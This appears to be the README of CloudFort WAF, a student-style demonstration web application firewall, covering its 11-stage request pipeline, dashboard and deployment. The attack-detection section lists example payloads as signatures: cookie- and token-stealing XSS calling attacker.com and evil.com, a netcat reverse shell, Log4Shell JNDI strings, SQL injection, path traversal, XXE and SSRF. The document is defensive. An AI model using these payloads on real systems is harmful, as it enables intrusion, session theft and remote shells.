<div align="center">

<br/>

```
  ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗ ██████╗ ██████╗ ████████╗
 ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝
 ██║     ██║     ██║   ██║██║   ██║██║  ██║█████╗  ██║   ██║██████╔╝   ██║   
 ██║     ██║     ██║   ██║██║   ██║██║  ██║██╔══╝  ██║   ██║██╔══██╗   ██║   
 ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝██║     ╚██████╔╝██║  ██║   ██║   
  ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝  
                                                     W A F
```

### 🛡️ Cloud-Native Web Application Firewall

*Protect. Detect. Monitor.*

<br/>

[![Live Demo](https://img.shields.io/badge/🌐_Live_Demo-Protected_App-2563EB?style=for-the-badge)](https://cloudfort-waf-demo-production.up.railway.app/)
[![Dashboard](https://img.shields.io/badge/📊_Dashboard-Security_Monitor-7C3AED?style=for-the-badge)](https://cloudfort-waf-demo-production.up.railway.app/dashboard/)
[![Docker](https://img.shields.io/badge/🐳_Docker-Ready-0EA5E9?style=for-the-badge)](https://www.docker.com/)
[![Railway](https://img.shields.io/badge/🚂_Deployed_on-Railway-0F172A?style=for-the-badge)](https://railway.app/)

<br/>

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=flat-square&logo=fastapi&logoColor=white)
![React](https://img.shields.io/badge/React-61DAFB?style=flat-square&logo=react&logoColor=black)
![SQLite](https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)
![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat-square&logo=nodedotjs&logoColor=white)

<br/>

</div>

---

## 📖 What is CloudFort WAF?

**CloudFort** is a cloud-native **Web Application Firewall (WAF)** built as a reverse-proxy security gateway. It intercepts every HTTP request before it reaches your application — scanning payloads, blocking threats, enforcing rate limits, and giving you full visibility through a real-time security dashboard.

> Think of CloudFort as a heavily-armed bouncer standing between the internet and your application. Every visitor gets screened. Only the legitimate ones get through.

---

## 🏗️ Architecture

```
                          ╔══════════════════╗
                          ║      CLIENT      ║
                          ╚════════╤═════════╝
                                   │  HTTP Request
                                   ▼
          ╔══════════════════════════════════════════════╗
          ║               🛡️  CloudFort WAF              ║
          ║                                              ║
          ║   ┌──────────────────────────────────────┐  ║
          ║   │  1. 🔍  IP Identification             │  ║
          ║   │  2. 🆔  Request ID Generation         │  ║
          ║   │  3. 🚫  Blacklist Validation           │  ║
          ║   │  4. ⏱️  Rate Limiting                  │  ║
          ║   │  5. 📦  Payload Extraction             │  ║
          ║   │  6. 🔄  Payload Normalization          │  ║
          ║   │  7. 🎯  Attack Detection Engine        │  ║
          ║   │  8. ⚖️  Severity Scoring               │  ║
          ║   │  9. 🔒  Request Blocking / Forwarding  │  ║
          ║   │ 10. 📝  Attack Logging                 │  ║
          ║   │ 11. 🛡️  Security Header Injection      │  ║
          ║   └──────────────────────────────────────┘  ║
          ╚═════════════════════╤════════════════════════╝
                                │  Clean Traffic Only
                                ▼
          ╔══════════════════════════════════════════════╗
          ║           🏪  NexaStore (Demo App)           ║
          ║           Protected Web Application          ║
          ╚══════════════════════════════════════════════╝
                                │  Response
                                ▼
                          ╔══════════════════╗
                          ║      CLIENT      ║
                          ╚══════════════════╝
```

---

## ⚙️ Request Lifecycle

Every incoming request travels through an 11-stage security pipeline before it's either **blocked** or **forwarded** to the protected application.

---

### Stage 1 — 🔍 IP Identification

CloudFort extracts the client's source IP address at the edge. This identifier is used as the foundation for rate limiting, blacklist checks, attack attribution, and audit logging throughout the entire pipeline.

---

### Stage 2 — 🆔 Request ID Generation

Each request is assigned a unique, sequential identifier:

```
REQ-2026-0001
REQ-2026-0002
REQ-2026-0003
```

This makes cross-referencing logs, tracing incidents, and correlating attacks trivial.

---

### Stage 3 — 🚫 Blacklist Validation

Before any deep inspection, CloudFort immediately rejects any IP address on the blacklist:

```
HTTP 403 Forbidden — IP Blacklisted
```

Blacklist entries can be added, viewed, and removed via the live dashboard.

---

### Stage 4 — ⏱️ Rate Limiting

CloudFort tracks request frequency per IP. When a threshold is exceeded:

```
HTTP 429 Too Many Requests
```

This mitigates brute-force attacks, automated scanners, credential stuffing, and abusive bots before they waste any server resources.

---

### Stage 5 — 📦 Payload Extraction

The WAF inspects every layer of the HTTP request:

| Source              | Examples                        |
|---------------------|---------------------------------|
| URL paths           | `/admin`, `/../etc/passwd`      |
| Query parameters    | `?id=1 OR 1=1`                  |
| Request bodies      | `{"user": "<script>alert(1)"}` |
| HTTP headers        | `X-Forwarded-For`, `Referer`    |
| User-Agent strings  | `sqlmap/1.6`, `Nikto/2.1`       |

---

### Stage 6 — 🔄 Payload Normalization

Attackers frequently encode payloads to evade signature-based detection. CloudFort normalizes all inputs before scanning:

| Technique              | Before                                      | After                         |
|------------------------|---------------------------------------------|-------------------------------|
| URL Decoding           | `%3Cscript%3Ealert(1)%3C/script%3E`        | `<script>alert(1)</script>`   |
| HTML Entity Decoding   | `&lt;img onerror=alert(1)&gt;`              | `<img onerror=alert(1)>`      |
| Null-Byte Removal      | `admin%00.php`                              | `admin.php`                   |
| Whitespace Normalization | `SEL  ECT   *  FROM`                      | `SELECT * FROM`               |

---

### Stage 7 — 🎯 Attack Detection Engine

Normalized payloads are evaluated against a signature library covering **8 attack categories**:

<br/>

#### 💉 SQL Injection
```sql
' OR 1=1 --
UNION SELECT username, password FROM users
'; DROP TABLE users; --
```

#### 🖥️ Cross-Site Scripting (XSS)
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror=alert(document.domain)>
<svg onload=fetch('//evil.com?x='+localStorage.token)>
```

#### 📂 Path Traversal
```
../../etc/passwd
..\..\windows\system32\config\sam
%2e%2e%2fetc%2fshadow
```

#### 💻 Command Injection
```bash
; whoami
&& cat /etc/passwd
| nc attacker.com 4444 -e /bin/bash
```

#### 🔗 Server-Side Request Forgery (SSRF)
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/
http://internal-service.corp/api/keys
```

#### 📄 XML External Entity (XXE)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

#### ☢️ Log4Shell
```
${jndi:ldap://attacker.com/a}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/exploit}
```

#### 🤖 Suspicious User Agents
```
sqlmap/1.6.12#stable
Nikto/2.1.6
Acunetix-Scanner
```

---

### Stage 8 — ⚖️ Severity Scoring

Each matched signature contributes to a cumulative severity score:

| Attack Category     | Severity     | Score Weight |
|---------------------|--------------|:------------:|
| XSS                 | 🟡 Medium    | ••○○○        |
| SQL Injection        | 🔴 High      | ••••○        |
| Path Traversal       | 🔴 High      | ••••○        |
| SSRF                | 🔴 High      | ••••○        |
| XXE                 | 🔴 High      | ••••○        |
| Command Injection    | 🔴 Critical  | •••••        |
| Log4Shell           | 🔴 Critical  | •••••        |

The final score determines whether a request is blocked or allowed.

---

### Stage 9 — 🔒 Blocking Logic

```
Severity Score ≥ Threshold  →  HTTP 403 Forbidden  →  Attack Logged
Severity Score <  Threshold  →  Request Forwarded  →  Event Logged
```

---

### Stage 10 — 📝 Attack Logging

Every security event is persisted to SQLite with full forensic detail:

| Field         | Example Value              |
|---------------|----------------------------|
| Request ID    | `REQ-2026-0047`            |
| Source IP     | `192.168.1.10`             |
| HTTP Method   | `POST`                     |
| Request Path  | `/login`                   |
| Attack Type   | `SQL Injection`            |
| Payload       | `' OR 1=1 --`              |
| Severity      | `High`                     |
| Action Taken  | `Blocked`                  |
| Timestamp     | `2026-06-15T14:32:01Z`     |

---

### Stage 11 — 🛡️ Security Header Injection

CloudFort injects hardened security headers into every response before it reaches the client:

```http
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

## 📊 Security Dashboard

The **React-powered dashboard** provides a real-time window into your security posture:

```
┌─────────────────────────────────────────────────────────────────┐
│  🛡️ CloudFort Security Dashboard                  [Live ●]      │
├───────────────┬───────────────┬───────────────┬─────────────────┤
│  Total Attacks │ Unique Attkrs │ Blocked Reqs  │  Active IPs     │
│     1,284      │      47       │    1,197      │      312        │
├───────────────┴───────────────┴───────────────┴─────────────────┤
│  Attack Distribution               Hourly Activity              │
│  ████████████  SQL Injection  42%  │ ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▂▃▄▅▆▇    │
│  ██████        XSS            28%  │                             │
│  ████          Path Traversal 18%  │                             │
│  ██            Command Inj.    8%  │                             │
│  █             Other           4%  │                             │
├─────────────────────────────────────────────────────────────────┤
│  Top Attackers                 Blacklist Management             │
│  192.168.1.10  →  214 attacks  │  [+ Add IP]  [View All]       │
│  10.0.0.42     →  187 attacks  │  ● 203.0.113.5  [Remove]      │
│  172.16.0.8    →  91  attacks  │  ● 198.51.100.2 [Remove]      │
└─────────────────────────────────────────────────────────────────┘
```

**Dashboard Features:**

- **Attack Overview** — Total attacks, unique attackers, blocked requests, at a glance
- **Threat Analytics** — Attack category breakdown and hourly activity heatmaps
- **Attacker Visibility** — Top offending IPs ranked by attack volume
- **Blacklist Management** — Add and remove blocked IPs instantly from the UI
- **Attack Logs** — Full event records with payloads, severity scores, and timestamps

---

## ✅ Security Feature Matrix

| Feature                      | Status  | Description                                    |
|------------------------------|:-------:|------------------------------------------------|
| Reverse Proxy Protection     | ✅      | Shields the backend from direct exposure       |
| SQL Injection Detection      | ✅      | Covers union-based, blind, error-based attacks |
| XSS Detection                | ✅      | Reflected, stored, and DOM-based payloads      |
| Path Traversal Detection     | ✅      | Unix and Windows traversal patterns            |
| Command Injection Detection  | ✅      | Shell metacharacter and pipe detection         |
| SSRF Detection               | ✅      | Internal IP and metadata endpoint blocking     |
| XXE Detection                | ✅      | External entity declaration patterns           |
| Log4Shell Detection          | ✅      | JNDI lookup payload signatures                 |
| Payload Normalization        | ✅      | URL, HTML, null-byte, whitespace decoding      |
| Rate Limiting                | ✅      | Per-IP threshold with 429 responses            |
| IP Blacklisting              | ✅      | Dynamic blocklist with dashboard management    |
| Structured Logging           | ✅      | Full forensic event records in SQLite          |
| Security Header Injection    | ✅      | CSP, HSTS, X-Frame-Options, and more          |
| Real-Time Dashboard          | ✅      | React-powered live security monitoring         |
| Docker Deployment            | ✅      | Single-container, production-ready image       |
| Cloud Deployment             | ✅      | Live on Railway                                |

---

## 🛠️ Technology Stack

```
┌─────────────────────────────────────────────────────────┐
│                    CloudFort WAF Stack                  │
├──────────────┬──────────────────────────────────────────┤
│  WAF Backend │  Python · FastAPI · HTTPX · Uvicorn     │
│  Data Store  │  SQLite                                  │
│  Dashboard   │  React · Vite · JavaScript · CSS        │
│  Demo App    │  Node.js · Express.js                   │
│  Containers  │  Docker                                  │
│  Cloud       │  Railway                                 │
└──────────────┴──────────────────────────────────────────┘
```

---

## 📁 Repository Structure

```
cloudfort-waf-demo/
│
├── 📂 cloud-waf/                   ← WAF Core
│   └── app/
│       ├── 🐍 main.py              ← Entry point & reverse proxy logic
│       ├── 🎯 detection.py         ← Attack signature engine
│       ├── 🗄️  database.py         ← SQLite logging layer
│       ├── 🚫 blacklist.py         ← IP blocklist management
│       ├── ⏱️  rate_limiter.py      ← Per-IP rate limiting
│       └── ⚙️  config.py           ← Configuration constants
│
├── 📂 demo-site/                   ← Protected Application
│   ├── 🟢 server.js                ← Express.js backend (NexaStore)
│   ├── 📦 package.json
│   └── 📂 public/
│
├── 📂 waf-dashboard/               ← Security Dashboard
│   ├── 📂 src/                     ← React source
│   ├── 📦 package.json
│   └── ⚡ vite.config.js
│
├── 🐳 Dockerfile                   ← Multi-service container
├── 📋 DEPLOYMENT.md                ← Deployment guide
└── 📖 README.md
```

---

## 🚀 Quick Start

### Local Development

```bash
# 1. Clone the repository
git clone https://github.com/Mazen2004212/cloudfort-waf-demo.git
cd cloudfort-waf-demo

# 2. Start the protected application (NexaStore)
cd demo-site
npm install
npm start

# 3. Start the WAF (in a new terminal)
cd cloud-waf/app
pip install -r requirements.txt
uvicorn main:app --reload --port 8000

# 4. Start the dashboard (in a new terminal)
cd waf-dashboard
npm install
npm run dev
```

| Service            | URL                        |
|--------------------|----------------------------|
| Protected App      | http://localhost:8000       |
| Security Dashboard | http://localhost:8000/dashboard |

---

### Docker Deployment

```bash
# Build the image
docker build -t cloudfort-waf .

# Run the container
docker run -p 8000:8000 cloudfort-waf
```

```
Application  →  http://localhost:8000
Dashboard    →  http://localhost:8000/dashboard
```

---

## 🔮 Roadmap

```
Current ──────────────────────────────────────────────────► Future

[✅ Core WAF]  [✅ Dashboard]  [✅ Docker]  [✅ Cloud]
                                                    │
                    ┌───────────────────────────────▼────────────────────────┐
                    │  🔐 Authentication & RBAC                              │
                    │  🐘 PostgreSQL + Redis                                 │
                    │  📡 SIEM Integration & Email Alerts                    │
                    │  🌍 GeoIP Filtering                                    │
                    │  📋 OWASP Core Rule Set (CRS) Compatibility            │
                    │  ☸️  Kubernetes Deployment                              │
                    │  🔄 CI/CD Pipeline                                     │
                    │  🤖 Machine Learning Detection                         │
                    │  🧠 Threat Intelligence Feed Integration               │
                    └────────────────────────────────────────────────────────┘
```

---

## ⚠️ Disclaimer

CloudFort WAF is an **educational and demonstration-oriented prototype** designed to showcase:

- Reverse proxy security architecture
- Application-layer attack detection
- Security event logging and monitoring
- Cloud-native deployment patterns

It is **not intended to replace enterprise-grade WAF solutions** in production environments. For production use, consider solutions such as AWS WAF, Cloudflare WAF, or ModSecurity with the OWASP Core Rule Set.

---

<div align="center">

<br/>

```
██╗    ██╗ █████╗ ███████╗    ███████╗ ██████╗  ██████╗
██║    ██║██╔══██╗██╔════╝    ██╔════╝██╔═══██╗██╔════╝
██║ █╗ ██║███████║█████╗      █████╗  ██║   ██║██║
██║███╗██║██╔══██║██╔══╝      ██╔══╝  ██║   ██║██║
╚███╔███╔╝██║  ██║██║         ██║     ╚██████╔╝╚██████╗
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═╝      ╚═════╝  ╚═════╝
```

**🛡️ CloudFort WAF** — *Protect · Detect · Monitor*

Built with ❤️ using **FastAPI**, **React**, **Docker**, and **Railway**

<br/>

[![GitHub](https://img.shields.io/badge/GitHub-cloudfort--waf--demo-181717?style=for-the-badge&logo=github)](https://github.com/Mazen2004212/cloudfort-waf-demo)

</div>
